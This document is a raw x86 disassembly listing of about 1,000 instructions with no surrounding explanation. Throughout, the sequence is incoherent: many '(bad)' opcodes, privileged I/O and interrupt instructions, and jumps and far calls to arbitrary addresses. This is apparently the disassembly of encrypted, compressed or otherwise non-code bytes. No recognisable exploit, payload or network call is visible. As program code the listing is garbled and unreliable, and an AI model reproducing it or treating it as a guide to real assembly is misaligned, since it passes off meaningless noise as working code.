  41ff94:	sub    ch,BYTE PTR [edi]
  41ff96:	xor    eax,0x6a760212
  41ff9b:	lea    edx,[ebx]
  41ff9d:	sub    BYTE PTR [eax+0x6f3ff69a],al
  41ffa3:	push   esi
  41ffa4:	mov    edx,0xc2938f0a
  41ffa9:	leave  
  41ffaa:	pushf  
  41ffab:	nop
  41ffac:	sti    
  41ffad:	mov    BYTE PTR [ebp-0xe],dh
  41ffb0:	pusha  
  41ffb1:	(bad)
  41ffb4:	icebp  
  41ffb5:	jbe    0x41ffab
  41ffb7:	inc    ebp
  41ffb8:	(bad)  
  41ffb9:	push   ds
  41ffba:	outs   dx,DWORD PTR ds:[esi]
  41ffbb:	(bad)  
  41ffbc:	lock pop ss
  41ffbe:	ret    0x7880
  41ffc1:	fwait
  41ffc2:	lock aaa 
  41ffc4:	dec    ebp
  41ffc5:	les    edx,FWORD PTR [ebx-0x3d]
  41ffc8:	jle    0x41ffeb
  41ffca:	sbb    dh,dh
  41ffcc:	cmp    DWORD PTR [esi+eiz*2-0x6f0d05ac],esp
  41ffd3:	add    ebx,DWORD PTR [esi+ebx*2-0x25cd33b5]
  41ffda:	jmp    FWORD PTR [ecx-0x76]
  41ffdd:	mov    edi,0xa525d680
  41ffe2:	loopne 0x420019
  41ffe4:	mov    ebx,0x4a892c0
  41ffe9:	inc    ebp
  41ffea:	mov    dh,0xd5
  41ffec:	scas   al,BYTE PTR es:[edi]
  41ffed:	gs stc 
  41ffef:	std    
  41fff0:	stc    
  41fff1:	fcmovbe st,st(0)
  41fff3:	xchg   esp,eax
  41fff4:	not    edi
  41fff6:	xchg   ecx,eax
  41fff7:	imul   esp,DWORD PTR [edx],0x241d51ae
  41fffd:	xor    DWORD PTR [ecx-0x31e027a0],ebp
  420003:	jae    0x420060
  420005:	sbb    dl,al
  420007:	inc    eax
  420008:	xchg   edi,eax
  420009:	js     0x420076
  42000b:	xchg   DWORD PTR ds:0xd70d5f9e,ecx
  420011:	jbe    0x41ffae
  420013:	and    DWORD PTR [ebp-0x52cd20cc],ebp
  420019:	in     al,dx
  42001a:	test   al,0x39
  42001c:	repz imul ebx,DWORD PTR [esi],0x5e2b8eb9
  420023:	test   al,0x41
  420025:	jns    0x41fffa
  420027:	xlat   BYTE PTR ds:[ebx]
  420028:	daa    
  420029:	clc    
  42002a:	xor    al,0xad
  42002c:	cmc    
  42002d:	out    0xe,al
  42002f:	ds cdq 
  420031:	rcl    DWORD PTR [esi-0x12999287],cl
  420037:	fadd   DWORD PTR [ecx]
  420039:	push   esi
  42003a:	ins    DWORD PTR es:[edi],dx
  42003b:	adc    al,0x68
  42003d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42003e:	(bad)  
  420040:	in     eax,dx
  420041:	iret   
  420042:	lahf   
  420043:	mov    bl,ch
  420045:	inc    ebp
  420046:	or     al,0x94
  420048:	rol    BYTE PTR [esi-0x60],0xaa
  42004c:	sub    BYTE PTR [eax],bl
  42004e:	adc    BYTE PTR [edi-0x211758d9],0x33
  420055:	cmp    al,0x78
  420057:	jb     0x420029
  420059:	push   esi
  42005a:	and    bl,cl
  42005c:	sbb    BYTE PTR [ebx+0x4f],al
  42005f:	pop    eax
  420060:	pop    ebp
  420061:	adc    eax,eax
  420063:	add    BYTE PTR [eax-0x70],0xf9
  420067:	dec    esp
  420068:	std    
  420069:	call   0xd2a9feeb
  42006e:	and    DWORD PTR [esp+eax*2-0x3615b6d3],ecx
  420075:	add    bh,0x62
  420078:	mov    ds:0xc298455d,eax
  42007d:	enter  0xf800,0xe9
  420081:	scas   al,BYTE PTR es:[edi]
  420082:	jae    0x4200a7
  420084:	(bad)  
  420085:	sahf   
  420086:	loopne 0x420090
  420088:	mov    esp,edx
  42008a:	(bad)  
  42008b:	loope  0x420014
  42008d:	inc    edi
  42008e:	call   0xa4fba124
  420093:	dec    ecx
  420094:	adc    ebx,edx
  420096:	mov    edx,cs
  420098:	rdtsc  
  42009a:	mov    bl,0x5e
  42009c:	mov    ebp,0xbd05b387
  4200a1:	push   ds
  4200a2:	add    BYTE PTR [esi+0x2f],cl
  4200a5:	sbb    ebp,ecx
  4200a7:	in     eax,dx
  4200a8:	test   DWORD PTR [ecx],edi
  4200aa:	stos   BYTE PTR es:[edi],al
  4200ab:	fdiv   QWORD PTR [ebx+0x6d]
  4200ae:	push   0xffffff8a
  4200b0:	cmp    al,0x77
  4200b2:	jg     0x42012b
  4200b4:	jp     0x420075
  4200b6:	xchg   ecx,eax
  4200b7:	xlat   BYTE PTR ds:[ebx]
  4200b8:	jno    0x420105
  4200ba:	or     DWORD PTR [ebx+edx*2+0x7],ebp
  4200be:	push   0xffffffeb
  4200c0:	adc    al,0xe2
  4200c2:	mov    bl,0x9a
  4200c4:	shl    ecx,1
  4200c6:	imul   esi,DWORD PTR [edi+0x25],0x20b31128
  4200cd:	mov    WORD PTR [eax+ebp*1],ss
  4200d0:	push   cs
  4200d1:	or     DWORD PTR [esi],ebp
  4200d3:	ret    0xb568
  4200d6:	xor    BYTE PTR [edx-0x21],cl
  4200d9:	sti    
  4200da:	les    ebx,FWORD PTR [esi]
  4200dc:	add    BYTE PTR [edx],0x7e
  4200df:	sar    DWORD PTR [ebx-0x65a325e8],1
  4200e5:	in     al,0xbf
  4200e7:	sbb    al,0x7a
  4200e9:	(bad)  
  4200ea:	xchg   esp,eax
  4200eb:	loopne 0x42010b
  4200ed:	leave  
  4200ee:	stos   DWORD PTR es:[edi],eax
  4200ef:	jl     0x4200a2
  4200f1:	mov    BYTE PTR [ebx-0x43],dh
  4200f4:	jno    0x4200ae
  4200f6:	imul   ecx,DWORD PTR [ebp-0x4],0x2b4e93fd
  4200fd:	test   al,0xa2
  4200ff:	sbb    ch,cl
  420101:	push   ss
  420102:	jmp    0xdc16ccb0
  420107:	arpl   WORD PTR ds:0xca2c0acc,di
  42010d:	sahf   
  42010e:	jmp    0x18a:0x66643492
  420115:	xlat   BYTE PTR ds:[ebx]
  420116:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420117:	and    eax,0x7b73b783
  42011c:	xchg   ebx,eax
  42011d:	inc    ebx
  42011e:	dec    ebp
  42011f:	mov    BYTE PTR ds:0x1c97e10,ch
  420125:	mov    ds:0x89f58f64,eax
  42012a:	inc    ecx
  42012b:	mov    eax,0x984edf42
  420130:	retf   
  420131:	dec    ebp
  420132:	clc    
  420133:	(bad)  
  420134:	adc    al,0x6e
  420136:	push   DWORD PTR [ebx-0x6c]
  420139:	cmp    al,0x27
  42013b:	retf   0x5211
  42013e:	rcl    al,0x51
  420141:	das    
  420142:	iret   
  420143:	push   edx
  420144:	mov    cs,WORD PTR [edx+ecx*8+0x71f136d3]
  42014b:	mov    ah,0xa8
  42014d:	jecxz  0x4200ff
  42014f:	aaa    
  420150:	repnz and ebx,DWORD PTR [eax+0x12]
  420154:	call   0x56b0ce41
  420159:	add    BYTE PTR [ecx-0x1b9bff85],dh
  42015f:	inc    eax
  420160:	or     al,0x81
  420162:	fnstenv [esi]
  420164:	pop    ecx
  420165:	cwde   
  420166:	les    ebp,FWORD PTR [eax]
  420168:	xor    DWORD PTR [esi-0x594e2015],ecx
  42016e:	stos   DWORD PTR es:[edi],eax
  42016f:	daa    
  420170:	out    dx,al
  420171:	jbe    0x4201b7
  420173:	lds    eax,FWORD PTR ds:0xefa942e4
  420179:	sub    DWORD PTR [eax+eax*8-0xc],0x5
  42017e:	aam    0x84
  420180:	inc    ecx
  420181:	and    DWORD PTR [ebx],ebp
  420183:	cmp    bp,ax
  420186:	mov    ecx,0x76e0fa01
  42018b:	and    esp,DWORD PTR [edi+0xe]
  42018e:	push   eax
  42018f:	shl    BYTE PTR [edi],0xb3
  420192:	jge    0x42014a
  420194:	(bad)  
  420195:	int3   
  420196:	repz push es
  420198:	mov    ds:0xeb61b89e,eax
  42019d:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  42019f:	ficom  DWORD PTR [esp+esi*4+0x4016d006]
  4201a6:	or     eax,0x2e3fbc35
  4201ab:	jns    0x420183
  4201ad:	mov    ebp,es
  4201af:	call   0xe3dad721
  4201b4:	add    DWORD PTR [ebp+eiz*4-0x201f4075],esi
  4201bb:	arpl   WORD PTR [ecx-0x2b],si
  4201be:	call   0x99647c3e
  4201c3:	in     eax,dx
  4201c4:	add    eax,0x3c8a1e58
  4201c9:	test   BYTE PTR [edi+0x29],al
  4201cc:	test   DWORD PTR [ebp+0x1c562d58],ebp
  4201d2:	pop    es
  4201d3:	lahf   
  4201d4:	push   edx
  4201d5:	(bad)  
  4201d6:	out    0x7a,al
  4201d8:	movntps XMMWORD PTR [eax],xmm2
  4201db:	xchg   esi,eax
  4201dc:	arpl   WORD PTR [ecx+0x15279c24],cx
  4201e2:	mov    ecx,0xf04102b1
  4201e7:	inc    ebx
  4201e8:	pop    ebx
  4201e9:	xchg   ecx,eax
  4201ea:	adc    ch,bl
  4201ec:	jo     0x42021b
  4201ee:	mov    BYTE PTR [eax-0x4722ff9d],ah
  4201f4:	mov    ds:0xa7840aa0,al
  4201f9:	xchg   BYTE PTR [esi-0x63],bh
  4201fc:	mov    dh,0xd1
  4201fe:	retf   
  4201ff:	ins    DWORD PTR es:[edi],dx
  420200:	call   0xc867:0x57284674
  420207:	retf   
  420208:	push   es
  420209:	xchg   BYTE PTR [esi-0xfa930f8],bh
  42020f:	pop    DWORD PTR [ebx-0x269b5691]
  420215:	jg     0x420238
  420217:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420218:	dec    edx
  420219:	out    0xb8,eax
  42021b:	dec    esp
  42021c:	mov    edx,0x218564fe
  420221:	into   
  420222:	aaa    
  420223:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420224:	xor    BYTE PTR [ebx-0x1129c8b6],ch
  42022a:	sahf   
  42022b:	add    BYTE PTR [edi+edx*2+0x51],dl
  42022f:	cmp    BYTE PTR [ecx+0x4450a54],dl
  420235:	sub    eax,edi
  420237:	and    DWORD PTR [ebp+0x2270cb11],ecx
  42023d:	cwde   
  42023e:	push   eax
  42023f:	push   esp
  420240:	jne    0x420265
  420242:	inc    edx
  420243:	add    bl,dl
  420245:	aam    0x5
  420247:	mov    bh,al
  420249:	popf   
  42024a:	mov    bh,al
  42024c:	gs push esp
  42024e:	inc    esp
  42024f:	sbb    edi,DWORD PTR [eax+0x3be224b4]
  420255:	add    BYTE PTR [esi],0x8d
  420258:	or     bl,ah
  42025a:	jb     0x4201f2
  42025c:	(bad)  
  42025d:	out    0x9a,al
  42025f:	stos   DWORD PTR es:[edi],eax
  420260:	add    ah,ch
  420262:	imul   esi,esp,0x4c
  420265:	dec    edx
  420266:	mov    bl,0x85
  420268:	cmp    dl,BYTE PTR [edi]
  42026a:	push   ss
  42026b:	xchg   ebx,eax
  42026c:	dec    ecx
  42026d:	push   ebx
  42026e:	dec    ebp
  42026f:	adc    ch,0xdf
  420272:	les    edx,FWORD PTR [ebp+0x0]
  420275:	push   ecx
  420276:	adc    DWORD PTR ds:0xa6973595,edi
  42027c:	les    eax,FWORD PTR [edi+0x143ab941]
  420282:	cmp    al,0xbb
  420284:	mov    ds:0xd24d3ece,al
  420289:	and    ah,BYTE PTR [esi]
  42028b:	arpl   di,bp
  42028d:	dec    esi
  42028e:	ret    
  42028f:	loopne 0x420264
  420291:	dec    edi
  420292:	push   esi
  420293:	cld    
  420294:	jg     0x420226
  420296:	psrlw  mm3,0xb2
  42029a:	lods   eax,DWORD PTR ds:[esi]
  42029b:	int3   
  42029c:	(bad)
  42029f:	inc    esi
  4202a0:	sbb    eax,DWORD PTR [edx+0x47905662]
  4202a6:	fcmovbe st,st(0)
  4202a8:	call   FWORD PTR [ebp+0x28]
  4202ab:	xlat   BYTE PTR ds:[ebx]
  4202ac:	sbb    al,0xf7
  4202ae:	fld    QWORD PTR [ecx-0x50]
  4202b1:	and    al,BYTE PTR [ebx+0x12]
  4202b4:	fcmovnbe st,st(5)
  4202b6:	dec    DWORD PTR [ecx+ebx*4]
  4202b9:	pusha  
  4202ba:	popa   
  4202bb:	mov    ecx,0xcd5a2e0a
  4202c0:	test   BYTE PTR [ebx+0x20d47d24],al
  4202c6:	mov    ch,0x32
  4202c8:	aaa    
  4202c9:	cmp    BYTE PTR [ebx],dh
  4202cb:	pusha  
  4202cc:	mov    eax,edx
  4202ce:	std    
  4202cf:	test   al,0x4a
  4202d1:	(bad)  
  4202d2:	(bad)  
  4202d3:	push   esi
  4202d5:	rcl    bh,1
  4202d7:	shr    BYTE PTR [edi+0xa9ee8a9],0x92
  4202de:	sar    DWORD PTR [esi-0x2bd171e0],1
  4202e4:	mov    ds:0xa15fda25,al
  4202e9:	and    al,0x94
  4202eb:	or     al,0xd3
  4202ed:	es xchg ecx,eax
  4202ef:	cmp    eax,0xaa158956
  4202f4:	xchg   DWORD PTR [esi],ebx
  4202f6:	mov    al,ds:0x91687e9d
  4202fb:	pusha  
  4202fc:	das    
  4202fd:	mov    eax,DWORD PTR [eax-0x1a]
  420300:	cli    
  420301:	cmp    eax,DWORD PTR [ebx]
  420303:	xor    DWORD PTR cs:[edi+0x55],0x7b8f74dd
  42030b:	ins    BYTE PTR es:[edi],dx
  42030c:	daa    
  42030d:	xchg   edi,eax
  42030e:	add    eax,0x7273022f
  420313:	icebp  
  420314:	dec    esi
  420315:	adc    al,0x43
  420317:	mov    bl,0x24
  420319:	dec    esi
  42031a:	idiv   BYTE PTR [ecx-0x6ad89a5b]
  420320:	cmp    ah,dl
  420322:	xor    eax,0x31775a69
  420327:	aad    0x19
  420329:	mov    edi,0x158a361d
  42032e:	aam    0x9d
  420330:	adc    al,0xdd
  420332:	or     eax,0x97040c7a
  420337:	loopne 0x42035a
  420339:	pop    esi
  42033a:	sub    DWORD PTR [esi+0x56],0x4ed30ff2
  420341:	aas    
  420342:	std    
  420343:	rol    DWORD PTR [ebx+0x41],0xb5
  420347:	hlt    
  420348:	rcl    esi,0xc8
  42034b:	outs   dx,BYTE PTR ds:[esi]
  42034c:	popf   
  42034d:	sub    eax,edi
  42034f:	out    dx,al
  420350:	xchg   edi,eax
  420351:	sbb    al,0x4a
  420353:	imul   dl
  420355:	adc    BYTE PTR [edx],dl
  420357:	icebp  
  420358:	jle    0x4202ed
  42035a:	stc    
  42035b:	mov    ecx,fs
  42035d:	pusha  
  42035e:	mov    eax,ds:0x560cb627
  420363:	push   edi
  420364:	adc    ecx,esp
  420366:	jno    0x4203a9
  420368:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420369:	inc    esi
  42036a:	outs   dx,BYTE PTR ds:[esi]
  42036b:	addr16 icebp 
  42036d:	lods   al,BYTE PTR ds:[esi]
  42036e:	(bad)  
  420370:	aas    
  420371:	out    0x9b,eax
  420373:	mov    al,ds:0xc45445b4
  420378:	and    eax,0x9eefa108
  42037d:	adc    eax,0xe394b974
  420382:	and    eax,0x98586c84
  420387:	pop    ebx
  420388:	popf   
  420389:	mov    ds:0xfab0e4a7,al
  42038e:	push   0x1214632b
  420393:	pop    eax
  420394:	arpl   WORD PTR [ecx],bp
  420396:	push   esp
  420397:	xchg   ecx,eax
  420398:	pop    ebp
  420399:	push   edx
  42039a:	sbb    edx,DWORD PTR [ecx+0x316f7285]
  4203a0:	clc    
  4203a1:	nop
  4203a2:	lods   al,BYTE PTR ds:[esi]
  4203a3:	in     eax,dx
  4203a4:	push   eax
  4203a5:	cmp    eax,DWORD PTR ds:0x272e2edb
  4203ab:	adc    al,0x61
  4203ad:	jno    0x420391
  4203af:	dec    ecx
  4203b0:	jae    0x420387
  4203b2:	dec    esi
  4203b3:	imul   esi,DWORD PTR [edx+0x4d],0x282ca64a
  4203ba:	loop   0x42035d
  4203bc:	dec    edi
  4203bd:	pop    ds
  4203be:	cmp    BYTE PTR [ebp+0x3],ch
  4203c1:	push   esp
  4203c2:	and    dl,BYTE PTR [esi+0x57]
  4203c5:	push   cs
  4203c6:	xor    eax,0x97e307b1
  4203cb:	test   DWORD PTR [ecx+edx*2-0x3d8bb224],esi
  4203d2:	out    dx,al
  4203d3:	and    eax,0x78446d50
  4203d8:	xor    BYTE PTR [ebp+0x19947969],dl
  4203de:	xor    al,0x75
  4203e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4203e1:	js     0x4203aa
  4203e3:	mov    BYTE PTR [edx+ebp*1],dl
  4203e6:	xchg   esp,eax
  4203e7:	push   eax
  4203e8:	mov    ebx,0xe0f33252
  4203ed:	mov    edi,0xf28ab172
  4203f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203f3:	popa   
  4203f4:	or     DWORD PTR [edi],ebx
  4203f6:	add    DWORD PTR [esi+0x29],0xffffffb0
  4203fa:	mov    ss,WORD PTR ds:0x247ea56a
  420400:	add    al,0xba
  420402:	dec    ebx
  420403:	sub    BYTE PTR [edi+0x3b],al
  420406:	ror    ecx,cl
  420408:	lahf   
  420409:	push   ss
  42040a:	(bad)  
  42040b:	jo     0x420455
  42040d:	adc    eax,0x620db63c
  420412:	aam    0x27
  420414:	xor    BYTE PTR [ebx+0x28f5e290],ah
  42041a:	ins    DWORD PTR es:[edi],dx
  42041b:	dec    ebp
  42041c:	imul   ebx,eax,0xffffffcc
  42041f:	div    BYTE PTR [ecx+0x27]
  420422:	adc    al,0x6e
  420424:	leave  
  420425:	popa   
  420426:	(bad)  
  420428:	pop    ebp
  420429:	jecxz  0x42041f
  42042b:	adc    eax,0x14e8f721
  420430:	jmp    0x4204a4
  420432:	mov    esi,0x840fb580
  420437:	push   0x74d44659
  42043c:	mov    ebx,0x1d9631ff
  420441:	or     BYTE PTR [ebx-0x4b3be2e8],al
  420447:	jle    0x4203df
  420449:	cmp    ch,BYTE PTR [esi]
  42044b:	or     DWORD PTR [eax-0x68],ebp
  42044e:	xor    eax,0xa3dc3be9
  420453:	jae    0x42040e
  420455:	and    eax,DWORD PTR es:[ebx+0x6664be5b]
  42045c:	or     BYTE PTR [ecx],dh
  42045e:	mov    al,0xc1
  420460:	mov    ebx,0xf726e4e2
  420465:	or     DWORD PTR [ebx-0x78],esi
  420468:	xchg   esp,eax
  420469:	ds push edi
  42046b:	hlt    
  42046c:	loope  0x42048a
  42046e:	pop    es
  42046f:	je     0x420438
  420471:	inc    esi
  420472:	fild   QWORD PTR [esi+0x28]
  420475:	ins    BYTE PTR es:[edi],dx
  420476:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420477:	push   es
  420478:	dec    esp
  420479:	and    DWORD PTR [ecx],eax
  42047b:	not    DWORD PTR [eax]
  42047d:	pusha  
  42047e:	loope  0x420450
  420480:	push   esi
  420481:	stos   DWORD PTR es:[edi],eax
  420482:	cli    
  420483:	pop    ebp
  420484:	fnstenv ds:0xad8673f6
  42048a:	sahf   
  42048b:	ins    DWORD PTR es:[edi],dx
  42048c:	mov    ah,0x40
  42048e:	pop    ebx
  42048f:	sbb    ah,ah
  420491:	stos   DWORD PTR es:[edi],eax
  420492:	jge    0x420484
  420494:	jge    0x4204ba
  420496:	sub    BYTE PTR [eax+0x52],0xad
  42049a:	mov    ebp,0xaebd66f9
  42049f:	icebp  
  4204a0:	sub    DWORD PTR [esi],eax
  4204a2:	fcom   st(3)
  4204a4:	dec    edx
  4204a5:	xor    BYTE PTR [esp+ebp*1-0x14],ch
  4204a9:	out    dx,al
  4204aa:	mov    edi,0x630bec12
  4204af:	fs xchg edi,eax
  4204b1:	jbe    0x4204d5
  4204b3:	outs   dx,DWORD PTR ds:[esi]
  4204b4:	add    eax,0xf8b619a9
  4204b9:	inc    esi
  4204ba:	mov    ds:0xd14b29dc,eax
  4204bf:	ss retf 0x7978
  4204c3:	fnstcw WORD PTR [edx-0x3622d1ab]
  4204c9:	repnz leave 
  4204cb:	lods   eax,DWORD PTR ds:[esi]
  4204cc:	or     ah,BYTE PTR [edi+eax*1-0x5f5d3206]
  4204d3:	ins    DWORD PTR es:[edi],dx
  4204d4:	mov    BYTE PTR [ebp-0x24],al
  4204d7:	xchg   DWORD PTR [ecx],esi
  4204d9:	mov    cs,ecx
  4204db:	mov    eax,0xacebe2d7
  4204e0:	dec    eax
  4204e1:	js     0x42047b
  4204e3:	in     eax,dx
  4204e4:	sub    eax,0xa21c4b2
  4204e9:	fs adc ecx,edx
  4204ec:	add    eax,0xbf9b1d64
  4204f1:	fcom   st(4)
  4204f3:	adc    esi,DWORD PTR [edi-0x39599d68]
  4204f9:	scas   eax,DWORD PTR es:[edi]
  4204fa:	pop    eax
  4204fb:	lea    edx,[ebx-0x5]
  4204fe:	mov    esp,0xf87c0636
  420503:	push   esp
  420504:	sub    DWORD PTR [ecx],0xfffffff2
  420507:	pop    esi
  420508:	cmp    esp,DWORD PTR [ebx+0x33dbd9fc]
  42050e:	dec    eax
  42050f:	mov    cl,bl
  420511:	call   0xe9d1d03
  420516:	xchg   edi,eax
  420517:	xor    edx,DWORD PTR [edx-0xf]
  42051a:	clc    
  42051b:	inc    eax
  42051c:	dec    edx
  42051d:	push   ebp
  42051e:	fcom   st(4)
  420520:	xchg   ecx,eax
  420521:	jae    0x420505
  420523:	shr    WORD PTR ds:0xc9b99033,0x5
  42052b:	jo     0x42056b
  42052d:	cmc    
  42052e:	lea    edi,[edi-0x6ea2df5e]
  420534:	in     eax,dx
  420535:	inc    edx
  420536:	adc    al,0x97
  420538:	mov    WORD PTR [ecx],cs
  42053a:	mov    dh,0xca
  42053c:	dec    edx
  42053d:	(bad)  
  42053f:	out    dx,al
  420540:	xchg   esp,eax
  420541:	and    BYTE PTR [ebx],0x96
  420544:	adc    esi,0xffffff9c
  420547:	out    0x7e,al
  420549:	jne    0x420565
  42054b:	or     esp,DWORD PTR [eax]
  42054d:	inc    edi
  42054e:	(bad)  
  42054f:	popf   
  420550:	xor    DWORD PTR [eax],esi
  420552:	or     al,BYTE PTR [eax+0x2fc24554]
  420558:	jnp    0x4204e1
  42055a:	ss jnp 0x420512
  42055d:	ror    DWORD PTR [esi+0x21],0x11
  420561:	dec    edi
  420562:	shl    DWORD PTR [esi+ebp*8+0x14],cl
  420566:	push   edx
  420567:	sbb    esi,DWORD PTR [edi-0x40]
  42056a:	hlt    
  42056b:	push   es
  42056c:	jecxz  0x420546
  42056e:	test   al,0x31
  420570:	retf   
  420571:	retf   
  420572:	fs inc eax
  420574:	sub    bl,BYTE PTR [esi]
  420576:	cmp    ebx,DWORD PTR [ecx]
  420578:	in     eax,0xdb
  42057a:	jns    0x42052f
  42057c:	add    dh,BYTE PTR [esi-0x5fd71299]
  420582:	mov    edx,0x95a250f8
  420587:	test   DWORD PTR [esi],ebp
  420589:	xchg   bl,ch
  42058b:	and    ah,BYTE PTR [ebx+0x74]
  42058e:	pushf  
  42058f:	ret    
  420590:	mov    fs,WORD PTR [edx+0x6f]
  420593:	pop    esi
  420594:	call   0x13b:0x125c157e
  42059b:	jns    0x420582
  42059d:	mov    dh,0x1b
  42059f:	dec    ecx
  4205a0:	and    eax,DWORD PTR [ebx+0x1382a8bc]
  4205a6:	jne    0x420609
  4205a8:	mov    al,0x72
  4205aa:	aas    
  4205ab:	not    BYTE PTR ds:[ebx-0x55242b4d]
  4205b2:	xchg   esi,eax
  4205b3:	add    esp,DWORD PTR [ebp+0x61]
  4205b6:	test   DWORD PTR [ebp-0x45b57261],edx
  4205bc:	and    cl,dl
  4205be:	stc    
  4205bf:	or     al,0x64
  4205c1:	ds mov ecx,0x55afc81d
  4205c7:	ja     0x420625
  4205c9:	cdq    
  4205ca:	push   esp
  4205cb:	add    BYTE PTR ds:0xd3165acc,0x8d
  4205d2:	push   es
  4205d3:	test   eax,0x7c08d305
  4205d8:	ret    
  4205d9:	addr16 xchg esi,eax
  4205db:	minps  xmm2,XMMWORD PTR ds:0x11ef8a73
  4205e2:	adc    eax,0x7bf3c269
  4205e7:	xchg   ebx,eax
  4205e8:	sti    
  4205e9:	jge    0x420646
  4205eb:	cdq    
  4205ec:	xchg   esi,eax
  4205ed:	jns    0x420623
  4205ef:	repnz push 0xfffffff6
  4205f2:	(bad)  
  4205f3:	jl     0x420601
  4205f5:	sub    ebp,ebp
  4205f7:	sub    dh,BYTE PTR [esi-0x3b]
  4205fa:	sbb    al,0x18
  4205fc:	out    dx,eax
  4205fd:	in     al,dx
  4205fe:	stos   BYTE PTR es:[edi],al
  4205ff:	jae    0x420587
  420601:	cmp    al,0xca
  420603:	push   edx
  420604:	xchg   esp,eax
  420605:	fwait
  420606:	mov    dh,cl
  420608:	out    0xfa,eax
  42060a:	je     0x420619
  42060c:	dec    esp
  42060d:	jle    0x42066f
  42060f:	push   cs
  420610:	pop    ecx
  420611:	mov    al,0x4f
  420613:	jle    0x4205de
  420615:	ret    
  420616:	jmp    0xbbade8cf
  42061b:	test   BYTE PTR [eax+ebx*2-0x15],dh
  42061f:	stos   BYTE PTR es:[edi],al
  420620:	mov    ecx,0xe934cd1e
  420625:	adc    dl,dl
  420627:	aad    0x47
  420629:	xor    eax,0xe59621a0
  42062e:	pop    ebx
  42062f:	gs inc ecx
  420631:	iret   
  420632:	or     al,0x1c
  420634:	mov    ebx,0x1baef426
  420639:	xor    ch,0xe8
  42063c:	jge    0x4205df
  42063e:	cs push ebp
  420640:	push   0x38df7a71
  420645:	sub    al,0xb6
  420647:	xor    BYTE PTR [ebp-0x6a670f5e],cl
  42064d:	hlt    
  42064e:	shl    BYTE PTR [ebx],1
  420650:	add    cl,ah
  420652:	jecxz  0x420694
  420654:	sub    BYTE PTR [edx],bl
  420656:	xchg   edi,ebp
  420658:	out    dx,al
  420659:	jl     0x420624
  42065b:	xor    BYTE PTR [ecx],ch
  42065d:	(bad)  
  42065e:	xor    al,0xcb
  420660:	mov    ah,0xcc
  420662:	shr    DWORD PTR [ebp-0x1a],0xd9
  420666:	or     BYTE PTR [edx],dh
  420668:	add    DWORD PTR [ebp-0x5f],esp
  42066b:	shr    BYTE PTR [ecx+0x73],0x3a
  42066f:	push   ecx
  420670:	call   0xb497:0xe69deff8
  420677:	call   0x55b22f44
  42067c:	sahf   
  42067d:	inc    ebx
  42067e:	xchg   edx,eax
  42067f:	aaa    
  420680:	xchg   edi,eax
  420681:	xor    dh,ch
  420683:	and    bl,0x65
  420686:	inc    edx
  420687:	pop    edi
  420688:	int3   
  420689:	xchg   ebp,eax
  42068a:	sbb    DWORD PTR [ebx-0x16b8ca8f],eax
  420690:	jno    0x4206b9
  420692:	add    dl,BYTE PTR [ecx]
  420694:	sbb    BYTE PTR [esi],dl
  420696:	sub    al,0x44
  420698:	rol    BYTE PTR [esi+0x42f20cba],cl
  42069e:	xor    DWORD PTR [ecx],ebp
  4206a0:	retf   0x3e5e
  4206a3:	xor    eax,DWORD PTR [esp+eiz*4-0xb]
  4206a7:	xchg   edx,eax
  4206a8:	mov    DWORD PTR [edi],eax
  4206aa:	mov    ecx,0x573dc637
  4206af:	inc    ecx
  4206b0:	dec    edx
  4206b1:	je     0x420662
  4206b3:	out    0xa9,al
  4206b5:	retf   0xc0d5
  4206b8:	xchg   esi,eax
  4206b9:	xor    DWORD PTR [eax-0xe],ecx
  4206bc:	pop    edi
  4206bd:	in     al,0x6a
  4206bf:	push   ss
  4206c0:	mov    edx,0x701e670d
  4206c5:	and    al,ah
  4206c7:	(bad)  
  4206c8:	pop    esp
  4206c9:	loope  0x4206c1
  4206cb:	cmp    al,0x50
  4206cd:	pop    esi
  4206ce:	push   0xffffffa3
  4206d0:	dec    esi
  4206d1:	mov    ebp,0x618a5089
  4206d6:	(bad)  
  4206d7:	out    0x0,eax
  4206d9:	es ins DWORD PTR es:[edi],dx
  4206db:	jns    0x42075b
  4206dd:	test   eax,0xede5232f
  4206e2:	xor    eax,0x8cd17f6
  4206e7:	data16 aam 0x5c
  4206ea:	aaa    
  4206eb:	aam    0x62
  4206ed:	mov    dh,0x37
  4206ef:	ret    
  4206f0:	add    ebx,DWORD PTR [ebx]
  4206f2:	cmp    BYTE PTR [esi-0x62afb0e6],dl
  4206f8:	push   eax
  4206f9:	gs cmp eax,0x448dd4c
  4206ff:	pop    esi
  420700:	inc    ecx
  420701:	out    dx,al
  420702:	mov    DWORD PTR [ecx+0x25],ebx
  420705:	xchg   ecx,eax
  420706:	push   ebx
  420707:	inc    ebp
  420708:	sbb    BYTE PTR gs:[esi+ecx*8+0x13],bh
  42070d:	add    dh,BYTE PTR [esi]
  42070f:	xlat   BYTE PTR ds:[ebx]
  420710:	jns    0x4206e5
  420712:	lds    ebp,FWORD PTR [eax+0x3e75eaeb]
  420718:	sbb    DWORD PTR [ecx-0x54],0xffffffe2
  42071c:	das    
  42071d:	jnp    0x42076a
  42071f:	aam    0x3f
  420721:	into   
  420722:	and    BYTE PTR [ecx+0x6b4c47d],dh
  420728:	sub    eax,0xe3fd297
  42072d:	pop    DWORD PTR [esi-0x2e]
  420730:	jecxz  0x420746
  420732:	jge    0x420735
  420734:	loope  0x4206cd
  420736:	jo     0x420740
  420738:	inc    edi
  420739:	jecxz  0x420772
  42073b:	int3   
  42073c:	inc    eax
  42073d:	dec    esp
  42073e:	push   ebx
  42073f:	or     ch,BYTE PTR [edx-0x6d44b980]
  420745:	pop    ss
  420746:	dec    ebp
  420747:	repz adc eax,0xc05f892d
  42074d:	xchg   ecx,eax
  42074e:	sti    
  42074f:	rcr    DWORD PTR [edx+0x20],0x3d
  420753:	push   es
  420754:	mov    bh,0xa1
  420756:	daa    
  420757:	push   ebp
  420758:	jmp    0x4206e5
  42075a:	inc    ecx
  42075b:	call   DWORD PTR [ebp-0x5799eceb]
  420761:	outs   dx,DWORD PTR ds:[esi]
  420762:	clc    
  420763:	mov    ch,0x70
  420765:	jecxz  0x42076e
  420767:	xlat   BYTE PTR ds:[ebx]
